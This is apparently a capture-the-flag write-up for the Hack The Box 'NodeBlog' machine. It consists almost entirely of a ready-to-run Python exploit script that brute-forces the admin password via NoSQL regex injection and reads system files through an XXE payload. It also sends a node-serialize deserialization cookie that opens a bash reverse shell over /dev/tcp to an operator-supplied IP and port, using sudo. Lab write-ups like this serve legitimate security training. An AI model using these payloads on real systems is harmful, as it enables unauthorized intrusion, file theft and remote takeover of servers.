---
title: NodeBlog Tools
date: 2023-07-21 12:00:00 pm
categories: [HTB]
tags: [HTB, Linux, Easy, Python Scripting, NoSQLI, XXE, Deseralization]

img_path: /assets/img/htb/writeups/nodeblog
---

# Python Script

* * *

With the script you gain full access to machine, read files and bruteforce admin login password:

```python
#!/usr/bin/env python3

"""
NodeBlog HTB
------------
Author: Marss
Date: 21 Jul, 2023
"""

import urllib.parse
from argparse import ArgumentParser, RawDescriptionHelpFormatter
from html import unescape
from signal import signal, SIGINT
from string import ascii_letters
from textwrap import dedent
from re import findall
from requests import Session, Request

# debugging
import pdb

# Ctrl + c
# (function)
def signal_handler(signum, frame):
	exit('\n[!] User terminated.')

# (signal)
signal(SIGINT, signal_handler)

# main class
class Exploit:

	def __init__(self, args):
		
		self.args = args
		self.target = '10.10.11.139:5000'
		self.session = Session()

		# proxies
		#self.proxies = {'http':'http://127.1:8080'}
		#self.session.proxies.update(self.proxies)

	def run(self):
		
		try:

			if self.args.brute:
				print('\n[+] Getting admin password:')
				password = self.no_sql_inyection()
				exit('\nAdmin passsword: ' + password)

			if self.args.file:
				print(f'\n[+] {self.args.file}:')
				content_file = self.xxe_read_file()
				exit(content_file)

			self.reverse_shell()

		except Exception as error:
			exit('\n[x] Error: ' + repr(error))

	def login(self, password: str) -> bool:
		
		post_data = {
			'user': 'admin',
			'password': {'$regex': f'{password}'}
		}

		req = Request('POST', 'http://' + self.target + '/login',
			json=post_data)
		prepare_req = self.session.prepare_request(req)
		response = self.session.send(prepare_req)

		if 'Invalid Password' in response.text:
			return False
		else: 
			return True

	def no_sql_inyection(self, password='') -> str:

		print(password)
		if self.login(f'^{password}$'):
				return password

		for letter in ascii_letters:
			
			if self.login(f'^{password}{letter}'):
				password += letter
				return self.no_sql_inyection(password)
			else:
				continue
			
	def xxe_read_file(self) -> str:

		xxe_payload = dedent("""
		<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{}"> ]>
		<post>
			<title>&xxe;</title>
			<description>&xxe;</description>
			<markdown>&xxe;</markdown>
		</post>""".format(self.args.file)).strip('\n')
		xml_file = {'file': (self.args.file, xxe_payload, 'text/plain')}

		req = Request('POST', 'http://' + self.target + '/articles/xml',
			files=xml_file)
		prepare_req = self.session.prepare_request(req)
		response = self.session.send(prepare_req)

		try:
			content_file = findall(r'value=.([^"]*)"', response.text)[0]
		except IndexError:
			exit('\n[!] Probably this file doesn\'t exist.')

		return unescape(content_file)

	def reverse_shell(self):

		"""
		{
			"rce":"_$$ND_FUNC$$_function(){
				require('child_process').exec('<command>', function(error, stdout, stderr) { console.log(stdout) });
			}()"
		}
		"""
		cmd = 'echo IppsecSaysPleaseSubscribe | sudo -S bash -c \'bash -i >& /dev/tcp/{ip}/{port} 0>&1\''.format(ip=self.args.ip, port=self.args.port)
		payload = """{"rce":"_$$ND_FUNC$$_function(){\\nrequire('child_process').exec(\\"%s\\", function(error, stdout, stderr) { console.log(stdout) });\\n}()"}""" % cmd
		encoded_payload = urllib.parse.quote(payload)
		
		cookies = {'auth': f'{encoded_payload}'}
		req = Request('GET', 'http://' + self.target + '/', cookies=cookies)
		prepare_req = self.session.prepare_request(req)

		print(f'\n[+] Open the port {self.args.port} to receive the shell')
		input('[+] Press ENTER to continue...')
		self.session.send(prepare_req)

# main flow
if __name__ == '__main__':
	
	title = '|NodeBlog HTB Tools|'

	parser = ArgumentParser(
		formatter_class=RawDescriptionHelpFormatter,
		epilog='Example:\n\npython3 NodeBlog.py -i 10.10.10.10 -p 4444')
	
	parser.add_argument('-i', '--ip', type=str, required=True, help='IP to receive the shell')
	parser.add_argument('-p', '--port', type=str, required=True, help='PORT to receive the shell')
	parser.add_argument('--brute', action='store_true', help='Get admin passwd')
	parser.add_argument('--file', type=str, help='Read system file (/etc/passwd)')

	args = parser.parse_args()

	print(title)

	exploit = Exploit(args)
	exploit.run()
```

## PoC

* * *

![PoC](PoC.png){: .shadow}

> Puedes encontrar el script y sus requerimientos en mi repositorio: [https://github.com/E1P0TR0](https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tools_NodeBlog)
{: .prompt-info}